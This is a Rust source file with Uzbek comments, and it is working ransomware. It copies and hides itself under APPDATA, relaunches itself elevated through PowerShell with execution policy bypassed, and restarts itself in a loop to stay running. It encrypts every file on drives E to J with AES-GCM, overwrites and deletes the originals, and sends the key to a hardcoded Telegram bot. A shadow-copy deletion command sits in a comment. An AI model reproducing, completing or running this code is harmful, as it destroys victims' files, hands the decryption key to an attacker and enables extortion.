use aes_gcm::{
    Aes256Gcm, Key, Nonce,
    aead::{Aead, KeyInit},
};
use base64::{Engine as _, engine::general_purpose};
use dotenv::dotenv;
use reqwest::blocking::Client;
use serde_json::json;
use sha2::{Digest, Sha256};
use std::{
    env,
    fs::{self, File, OpenOptions},
    io::{Read, Write},
    path::{Path, PathBuf},
    process::Command,
    sync::{Arc, Mutex, mpsc},
    thread,
};
use walkdir::WalkDir;

// Tizim fayllarini va .git papkalarini shifrlamaslik uchun filtr
const EXCLUDED_PATHS: [&str; 4] = [
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    "\\.git\\",
];

// Shifrlash funksiyasi
fn encrypt_file(
    file_path: &Path,
    key: &Key<Aes256Gcm>,
    nonce: &Nonce<aes_gcm::aead::generic_array::typenum::U12>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let mut f = File::open(file_path)?;
    let mut plaintext = Vec::new();
    f.read_to_end(&mut plaintext)?;
    println!("[+] O'qildi: {}", file_path.display());

    let cipher = Aes256Gcm::new(key);
    let ciphertext = cipher
        .encrypt(nonce, plaintext.as_ref())
        .map_err(|e| format!("Encrypt error: {}", e))?;
    println!("[*] Shifrlanmoqda: {}", file_path.display());

    let enc_path: PathBuf = {
        let parent = file_path.parent().unwrap_or_else(|| Path::new(""));
        let name = file_path.file_name().unwrap().to_string_lossy();
        parent.join(format!("{}.enc", name))
    };

    {
        let mut out = File::create(&enc_path)?;
        out.write_all(&ciphertext)?;
        out.sync_all()?;
    }
    println!("[+] Yaratildi: {}", enc_path.display());

    let meta = fs::metadata(&enc_path)?;
    if meta.len() > 0 {
        let mut orig = OpenOptions::new().write(true).open(file_path)?;
        let len = orig.metadata()?.len() as usize;
        let zeros = vec![0u8; len];
        for _ in 0..3 {
            orig.write_all(&zeros)?;
            orig.sync_all()?;
        }
        fs::remove_file(file_path)?;
        println!("[+] Original o'chirildi: {}", file_path.display());
    }

    Ok(())
}

// Boshqa shifrlovchi ilovalarni boshqarish funksiyasi
fn manage_encryption_instances(exe_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut children = Vec::new();
    let max_instances = 3; // Bir vaqtda ishlaydigan shifrlovchi ilovalar soni

    // Dastlabki shifrlovchi ilovalarni ishga tushirish
    for i in 0..max_instances {
        let child = Command::new("powershell")
            .arg("-NoProfile")
            .arg("-ExecutionPolicy")
            .arg("Bypass")
            .arg("-Command")
            .arg(format!(
                "Start-Process -FilePath '{}' -Verb RunAs",
                exe_path
            ))
            .spawn()
            .map_err(|e| format!("Spawn encryption instance {} error: {}", i, e))?;
        println!("[*] Encryption instance {} started: {:?}", i, child.id());
        children.push(child);
    }

    // Shifrlovchi ilovalarni kuzatish
    loop {
        for i in 0..children.len() {
            match children[i].try_wait() {
                Ok(Some(status)) => {
                    eprintln!(
                        "[-] Encryption instance {} exited with status: {}. Restarting...",
                        i, status
                    );
                    let child = Command::new("powershell")
                        .arg("-NoProfile")
                        .arg("-ExecutionPolicy")
                        .arg("Bypass")
                        .arg("-Command")
                        .arg(format!(
                            "Start-Process -FilePath '{}' -Verb RunAs",
                            exe_path
                        ))
                        .spawn()
                        .map_err(|e| format!("Restart encryption instance {} error: {}", i, e))?;
                    println!("[*] Encryption instance {} restarted: {:?}", i, child.id());
                    children[i] = child;
                }
                Ok(None) => {
                    // Ilova hali ishlamoqda
                }
                Err(e) => {
                    eprintln!(
                        "[-] Error checking encryption instance {} status: {}. Restarting...",
                        i, e
                    );
                    let child = Command::new("powershell")
                        .arg("-NoProfile")
                        .arg("-ExecutionPolicy")
                        .arg("Bypass")
                        .arg("-Command")
                        .arg(format!(
                            "Start-Process -FilePath '{}' -Verb RunAs",
                            exe_path
                        ))
                        .spawn()
                        .map_err(|e| format!("Restart encryption instance {} error: {}", i, e))?;
                    println!("[*] Encryption instance {} restarted: {:?}", i, child.id());
                    children[i] = child;
                }
            }
        }
        thread::sleep(std::time::Duration::from_secs(1));
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Argumentlarni tekshirish
    let args: Vec<String> = env::args().collect();
    if args.len() > 1 && args[1] == "-first" {
        println!(
            "[*] Ilova -first argumenti bilan ishga tushdi, shifrlovchi ilovalarni boshqarish..."
        );
        manage_encryption_instances(&args[0])?;
        return Ok(());
    }

    // .env yuklash
    dotenv().ok();
    let telegram_token = "7628596830:AAE7VdOVCQ-87PTbtGdNd7ntW3bqULahQ6o";
    let chat_id = "1179267491";

    // O'zini nusxalash
    let current_exe = env::current_exe().map_err(|e| format!("Current exe error: {}", e))?;
    let mut dest_dir = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".into());
    dest_dir.push_str("\\NonShared");
    let dest_dir = PathBuf::from(dest_dir);
    fs::create_dir_all(&dest_dir)
        .map_err(|e| format!("Create dir error {}: {}", dest_dir.display(), e))?;
    let file_name = current_exe.file_name().ok_or("Exe file name missing")?;
    let dest_exe = dest_dir.join(file_name);

    if current_exe != dest_exe {
        // Mavjud faylni o'chirish (agar mavjud bo'lsa)
        if dest_exe.exists() {
            fs::remove_file(&dest_exe)
                .map_err(|e| format!("Remove existing file error {}: {}", dest_exe.display(), e))?;
            println!("[*] Existing file removed: {:?}", dest_exe);
        }
        // Nusxalash
        fs::copy(current_exe, &dest_exe)
            .map_err(|e| format!("Copy exe error {}: {}", dest_exe.display(), e))?;
        println!("[*] Copied to {:?}", dest_exe);
        // Yashirish
        let status = Command::new("attrib")
            .args(&["+h", dest_exe.to_string_lossy().as_ref()])
            .status()
            .map_err(|e| format!("Attrib error: {}", e))?;
        if !status.success() {
            eprintln!("[-] Failed to hide file: {}", dest_exe.display());
        } else {
            println!("[*] Hidden via attrib +h");
        }
        // Klonni -first argumenti bilan ishga tushirish
        let mut child = Command::new("powershell")
            .arg("-NoProfile")
            .arg("-ExecutionPolicy")
            .arg("Bypass")
            .arg("-Command")
            .arg(format!(
                "Start-Process -FilePath '{}' -Verb RunAs -ArgumentList '-first'",
                dest_exe.display()
            ))
            .spawn()
            .map_err(|e| format!("Spawn error: {}", e))?;
        println!(
            "[*] Elevation requested for clone with -first: {:?}",
            dest_exe
        );

        // Klon jarayonni kuzatish
        loop {
            match child.try_wait() {
                Ok(Some(status)) => {
                    eprintln!("[-] Clone exited with status: {}. Restarting...", status);
                    child = Command::new("powershell")
                        .arg("-NoProfile")
                        .arg("-ExecutionPolicy")
                        .arg("Bypass")
                        .arg("-Command")
                        .arg(format!(
                            "Start-Process -FilePath '{}' -Verb RunAs -ArgumentList '-first'",
                            dest_exe.display()
                        ))
                        .spawn()
                        .map_err(|e| format!("Restart spawn error: {}", e))?;
                    println!("[*] Clone restarted: {:?}", dest_exe);
                }
                Ok(None) => {
                    thread::sleep(std::time::Duration::from_secs(1));
                }
                Err(e) => {
                    eprintln!("[-] Error checking clone status: {}. Restarting...", e);
                    child = Command::new("powershell")
                        .arg("-NoProfile")
                        .arg("-ExecutionPolicy")
                        .arg("Bypass")
                        .arg("-Command")
                        .arg(format!(
                            "Start-Process -FilePath '{}' -Verb RunAs -ArgumentList '-first'",
                            dest_exe.display()
                        ))
                        .spawn()
                        .map_err(|e| format!("Restart spawn error: {}", e))?;
                    println!("[*] Clone restarted: {:?}", dest_exe);
                }
            }
        }
    }

    // Shadow copy o'chirish (Windows Home uchun o'chirilgan)
    // let _ = Command::new("vssadmin").args(["delete", "shadows", "/all", "/quiet"]).status();

    // Kalit va nonce hosil qilish
    let mut hasher = Sha256::new();
    hasher.update("JasurFayllarmgaTegma");
    let key_bytes = hasher.finalize_reset();
    let key = Arc::new(Key::<Aes256Gcm>::from_slice(&key_bytes).clone());

    hasher.update("JasurFayllarmgaTegma");
    let nonce_bytes: [u8; 12] = hasher.finalize()[..12].try_into()?;
    let nonce = Arc::new(Nonce::from_slice(&nonce_bytes).clone());

    // Kalit va nonce faylga saqlash
    {
        let k_b64 = general_purpose::STANDARD.encode(&key_bytes);
        let n_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
        let mut f = File::create("key.txt")?;
        writeln!(f, "Key: {}\nNonce: {}", k_b64, n_b64)?;
        println!("[+] Kalit va nonce key.txt fayliga saqlandi");
    }

    // Fayl yo'llarini yig'ish
    let mut paths = Vec::new();
    for drive in ['E', 'F', 'G', 'H', 'I', 'J'] {
        let root = format!("{}:\\", drive);
        if Path::new(&root).exists() {
            for entry in WalkDir::new(&root).into_iter().filter_map(Result::ok) {
                let p = entry.into_path();
                if p.is_file()
                    && !EXCLUDED_PATHS
                        .iter()
                        .any(|ex| p.to_string_lossy().contains(ex))
                {
                    paths.push(p);
                }
            }
        }
    }

    // Maksimal thread soni
    let max_threads = thread::available_parallelism()?.get();
    println!("[*] Ishlaydigan thread soni: {}", max_threads);

    // Kanal va thread-pool
    let (tx, rx) = mpsc::channel::<PathBuf>();
    let rx = Arc::new(Mutex::new(rx));
    let mut handles = Vec::with_capacity(max_threads as usize);

    for _ in 0..max_threads {
        let rx = Arc::clone(&rx);
        let key = Arc::clone(&key);
        let nonce = Arc::clone(&nonce);

        let handle = thread::spawn(move || {
            while let Ok(path) = rx.lock().unwrap().recv() {
                if let Err(e) = encrypt_file(&path, &key, &nonce) {
                    eprintln!("[-] Xato {}: {}", path.display(), e);
                }
            }
        });
        handles.push(handle);
    }

    // Fayl yo'llarini kanalga yuborish
    for p in paths {
        tx.send(p)?;
    }
    drop(tx);

    // Thread’lar tugashini kutish
    for h in handles {
        h.join().unwrap();
    }

    // Kalit va nonce Telegramga yuborish
    let client = Client::new();
    let k_b64 = general_purpose::STANDARD.encode(&key_bytes);
    let n_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
    if let Err(e) = client
        .post(&format!(
            "https://api.telegram.org/bot{}/sendMessage",
            telegram_token
        ))
        .json(&json!({
            "chat_id": chat_id,
            "text": format!("Key: {}\nNonce: {}", k_b64, n_b64)
        }))
        .send()
    {
        eprintln!(
            "[-] Telegramga yuborishda xato: {}. Kalit key.txt fayliga saqlandi.",
            e
        );
    } else {
        println!("[+] Kalit va nonce Telegramga yuborildi");
    }

    println!(
        "[+] Barcha fayllar shifrlab bo'lingach, kalit Telegramga yuborildi yoki key.txt fayliga saqlandi!"
    );
    Ok(())
}
